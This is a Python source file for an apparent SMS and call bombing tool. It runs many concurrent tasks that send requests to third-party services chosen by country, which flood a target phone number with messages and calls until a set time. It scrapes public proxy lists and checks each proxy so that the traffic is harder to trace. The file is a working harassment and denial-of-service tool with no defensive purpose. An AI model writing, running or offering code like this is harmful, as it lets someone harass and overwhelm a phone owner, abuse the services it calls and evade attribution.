import threading
import time
import random
from smscallbomber.service import Service
from smscallbomber.Services import urls
import asyncio
import re
import aiohttp
from aiohttp import ClientSession, ClientTimeout
from itertools import cycle
import logging

def get_services(country_code, number):
    services = []
    for service in urls(number):
        if service['info']['country'] == 'ALL' or service['info']['country'] == country_code:
            services.append(service)
    return services

class SMSCallBomber(threading.Thread):
    def __init__(self, args):
        super().__init__()
        self.args = args
        if self.args.country == '7':
            self.country_code = 'RU'
        elif self.args.country == '375':
            self.country_code = 'BY'
        elif self.args.country == '380':
            self.country_code = 'UA'
        elif self.args.country == '998':
            self.country_code = 'UZ'
        else:
            self.country_code = 'ALL'
        if self.args.log_file:
            log_level = getattr(logging, self.args.log_level.upper(), logging.INFO)
            logging.basicConfig(
                level=log_level,
                format='[%(asctime)s] %(levelname)s: %(message)s',
                handlers=[
                    logging.FileHandler(self.args.log_file, encoding='utf-8'),
                    logging.StreamHandler()
                ]
            )
        else:
            logging.basicConfig(handlers=[logging.NullHandler()])
        self.proxy = None
        self.services = get_services(self.country_code, self.args.phone)
        self.successful_count = 0
        self.failed_count = 0
        self.running = True

    def run(self):
        asyncio.run(self._run())

    async def _run(self):
        async with ClientSession(timeout=ClientTimeout(total=self.args.timeout)) as session:
            self.proxy = self.args.proxy if self.args.proxy is not True else await self.generate_proxy(session)
            tasks = []
            for _ in range(self.args.threads):
                task = asyncio.create_task(self.attack(session))
                tasks.append(task)

            await asyncio.gather(*tasks)

    async def attack(self, session):
        local_successful_count = 0
        local_failed_count = 0
        while self.running and time.time() < self.args.time and self.services:
            service_info = random.choice(self.services)
            service = Service(service_info, self.args.phone, self.args.timeout, self.proxy)
            domain_name = service.get_domain_name()
            try:
                status_code = await service.send_request(session)
                if status_code == 200:
                    local_successful_count += 1
                else:
                    if service_info in self.services:
                        self.services.remove(service_info)
                    local_failed_count += 1
            except asyncio.TimeoutError:
                logging.info(f"Fail - {domain_name} - TimeoutError")
                if service_info in self.services:
                    self.services.remove(service_info)
                local_failed_count += 1
            except aiohttp.ClientError as e:
                logging.info(f"Fail - {domain_name} - ClientError: {e}")
                if service_info in self.services:
                    self.services.remove(service_info)
                local_failed_count += 1
            except Exception as err:
                logging.error(f"{err}")
                local_failed_count += 1
                if service_info in self.services:
                    self.services.remove(service_info)
            except (KeyboardInterrupt, SystemExit):
                exit()

        self.successful_count += local_successful_count
        self.failed_count += local_failed_count

    @staticmethod
    async def fetch_proxies(url, session):
        try:
            async with session.get(url, timeout=3) as res:
                if res.status == 200:
                    text = await res.text()
                    lines = text.splitlines()
                    return [line.strip() for line in lines if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', line.strip())]
        except:
            return []

    @staticmethod
    async def check_proxy(proxy, session):
        schemes = ["https", "http"]
        for scheme in schemes:
            try:
                proxy_url = f"{scheme}://{proxy}"
                async with session.get(f"{scheme}://httpbin.org/ip", proxy=proxy_url, timeout=3) as res:
                    if res.status == 200:
                        data = await res.json()
                        ip_from_proxy = data.get("origin", "")
                        if proxy.split(":")[0] in ip_from_proxy:
                            return proxy_url
            except Exception:
                continue
        return False

    async def generate_proxy(self, session):
        proxy_sources = [
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://www.sslproxies.org/",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
            "https://www.google-proxy.net/",
            "https://free-proxy-list.net/anonymous-proxy.html",
            "https://free-proxy-list.net/uk-proxy.html",
            "https://www.us-proxy.org/",
            "https://free-proxy-list.net/"
        ]
        random.shuffle(proxy_sources)
        for url in proxy_sources:
            proxies = await self.fetch_proxies(url, session)
            if not proxies:
                continue
            random.shuffle(proxies)
            for proxy in proxies:
                proxy_url = await self.check_proxy(proxy, session)
                if proxy_url:
                    return proxy_url
        return None

    def send_report(self):
        return self.successful_count, self.failed_count

    def stop(self):
        self.running = False